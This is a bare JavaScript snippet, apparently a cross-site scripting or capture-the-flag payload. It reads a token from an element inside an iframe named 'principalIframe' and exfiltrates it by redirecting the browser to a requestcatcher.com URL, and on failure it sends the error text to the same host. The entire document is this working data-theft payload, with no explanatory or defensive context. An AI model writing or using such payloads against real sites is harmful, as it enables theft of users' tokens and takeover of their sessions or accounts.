try {
const ifr = document.querySelector("#principalIframe")
const token = ifr.contentDocument.querySelector("#token")
window.location.href = `https://uj54uj.requestcatcher.com/${token}`
}catch(err) {
window.location.href = `https://uj54uj.requestcatcher.com/${err}`
}
